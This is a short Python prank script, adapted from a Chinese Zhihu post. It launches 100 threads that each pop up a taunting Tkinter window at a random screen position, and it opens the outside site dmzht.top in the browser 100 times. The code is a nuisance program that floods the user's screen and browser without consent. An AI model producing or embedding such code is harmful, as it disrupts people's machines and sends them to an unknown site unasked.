#“头文件”，此程序来自知乎：https://zhuanlan.zhihu.com/p/344567386，有删改
import tkinter as tk
import random
import threading
import time
import webbrowser

def boom():
    window = tk.Tk()
    width = window.winfo_screenwidth()
    height = window.winfo_screenheight()
    a = random.randrange(0, width)
    b = random.randrange(0, height)
    window.title('哼！')
    window.geometry("1000x50" + "+" + str(a) + "+" + str(b))
    tk.Label(window, text='说了不让你点，非要点，哼！', bg='white',
             font=('宋体', 17), width=60, height=4).pack()
    window.mainloop()

def main():
    threads = []
    for i in range(100):
        t = threading.Thread(target=boom)
        threads.append(t)
        time.sleep(0.1)
        webbrowser.open('dmzht.top')
        threads[i].start()

if __name__ == "__main__":
    
    main()
    
